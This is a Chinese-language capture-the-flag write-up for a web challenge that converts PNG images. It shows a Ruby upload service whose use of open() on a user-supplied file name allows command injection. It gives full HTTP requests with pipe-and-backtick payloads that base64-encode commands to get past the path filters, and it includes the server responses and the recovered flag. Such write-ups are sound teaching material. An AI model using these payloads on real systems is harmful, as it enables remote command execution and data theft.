::: info
2021-第五届空间智能安全大赛-Web-PNG图片转换器
:::

## 1、思路

（1）上传文件，没有限制文件类型，仅检查了文件扩展名是否为 png，但由于文件名取其摘要，无法通过一句话木马的方法获取 flag

```ruby
post '/upload' do
  unless params[:file] && params[:file][:tempfile] && params[:file][:filename] && params[:file][:filename].split('.')[-1] == 'png'
    return "<script>alert('error');location.href='/upload';</script>"
  end
  begin
    filename = Digest::MD5.hexdigest(Time.now.to_i.to_s + params[:file][:filename]) + '.png'
    open(filename, 'wb') { |f|
      f.write open(params[:file][:tempfile],'r').read()
    }
    "Upload success, file stored at #{filename}"
  rescue
    'something wrong'
  end

end
```

（2）转换文件，对符号 .. 和 / 进行了过滤，使用了不安全的函数 `open`，并输出 base64 编码的文件名

```ruby
post '/convert' do
  begin
    unless params['file']
      return "<script>alert('error');location.href='/convert';</script>"
    end

    file = params['file']
    unless file.index('..') == nil && file.index('/') == nil && file =~ /^(.+)\.png$/
      return "<script>alert('dont hack me');</script>"
    end
    res = open(file, 'r').read()
    headers 'Content-Type' => "text/html; charset=utf-8"
    "var img = document.createElement(\"img\");\nimg.src= \"data:image/png;base64," + Base64.encode64(res).gsub(/\s*/, '') + "\";\n"
  rescue
    'something wrong'
  end
end
```

（3）bp 截获请求报文，其中 file 的参数是文件名的 base64 编码，93511aa79635584bc1502b813fde80b7.png

```
POST /convert HTTP/1.1
Host: challenge-7157e81cd821f195.sandbox.ctfhub.com:10800
Content-Length: 37
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://challenge-7157e81cd821f195.sandbox.ctfhub.com:10800
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://challenge-7157e81cd821f195.sandbox.ctfhub.com:10800/convert
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

file=93511aa79635584bc1502b813fde80b7
```

## 2、文件名嵌入命令

### 文件名

由于输对文件名才会输出 `res = open(file, 'r').read()`，因此需要保证文件名的正确性

> file=93511aa79635584bc1502b813fde80b7.png

### 管道符

一个命令的输出可以通过管道作为另一个命令的输入

### 反引号

反引号间的内容会被 shell 先执行，其输出被放入主命令后，主命令再被执行

`ls -l`

⚠️ 由于对符号 .. 和 / 进行了过滤，可以先 base64 编码再解码 `echo bHMgLw== | base64 -d`（`-d` 解码，借助 `echo` 和管道符作为 base64 的参数）

> \`echo bHMgLw== | base64 -d` > 93511aa79635584bc1502b813fde80b7.png

即执行 `ls -l` 命令并将输出结果写入了 93511aa79635584bc1502b813fde80b7.png

### 赋值

> file=|\`echo bHMgLw== | base64 -d` > 93511aa79635584bc1502b813fde80b7.png

## 3、exp

（1）写入图片

```
POST /convert HTTP/1.1
Host: challenge-7157e81cd821f195.sandbox.ctfhub.com:10800
Content-Length: 41
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://challenge-e1de38dc4ce1968f.sandbox.ctfhub.com:10800
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://challenge-e1de38dc4ce1968f.sandbox.ctfhub.com:10800/convert
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close

file=|`echo bHMgLw== | base64 -d`>93511aa79635584bc1502b813fde80b7
```

（2）读取图片执行命令

```
POST /convert HTTP/1.1
Host: challenge-7157e81cd821f195.sandbox.ctfhub.com:10800
Content-Length: 41
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://challenge-e1de38dc4ce1968f.sandbox.ctfhub.com:10800
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://challenge-e1de38dc4ce1968f.sandbox.ctfhub.com:10800/convert
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close

file=93511aa79635584bc1502b813fde80b7
```

Response

```
HTTP/1.1 200 OK
Server: openresty/1.21.4.2
Date: Tue, 05 Mar 2024 01:58:09 GMT
Content-Type: text/html; charset=utf-8
Connection: close
X-Xss-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Access-Control-Allow-Origin: *
Access-Control-Allow-Headers: X-Requested-With
Access-Control-Allow-Methods: *
Content-Length: 204

var img = document.createElement("img");
img.src= "data:image/png;base64,YmluCmJvb3QKZGV2CmV0YwpmbGFnXzIxNDc5CmhvbWUKbGliCmxpYjY0Cm1lZGlhCm1udApvcHQKcHJvYwpyb290CnJ1bgpzYmluCnNydgpzeXMKdG1wCnVzcgp2YXIK";
```

解码结果

```
bin
boot
dev
etc
flag_21479
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

（3）读取图片执行命令

命令：`cat /flag_21479`

base64：Y2F0IC9mbGFnXzIxNDc5

```
POST /convert HTTP/1.1
Host: challenge-7157e81cd821f195.sandbox.ctfhub.com:10800
Content-Length: 41
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://challenge-e1de38dc4ce1968f.sandbox.ctfhub.com:10800
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://challenge-e1de38dc4ce1968f.sandbox.ctfhub.com:10800/convert
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close

file=|`echo Y2F0IC9mbGFnXzIxNDc5 | base64 -d`>93511aa79635584bc1502b813fde80b7
```

Response

```
HTTP/1.1 200 OK
Server: openresty/1.21.4.2
Date: Tue, 05 Mar 2024 02:04:01 GMT
Content-Type: text/html; charset=utf-8
Connection: close
X-Xss-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Access-Control-Allow-Origin: *
Access-Control-Allow-Headers: X-Requested-With
Access-Control-Allow-Methods: *
Content-Length: 120

var img = document.createElement("img");
img.src= "data:image/png;base64,Y3RmaHViezRkZTc5NzI0Y2U5ZDYxMTRiM2RjOWE4MX0K";
```

解码结果

```
ctfhub{4de79724ce9d6114b3dc9a81}
```

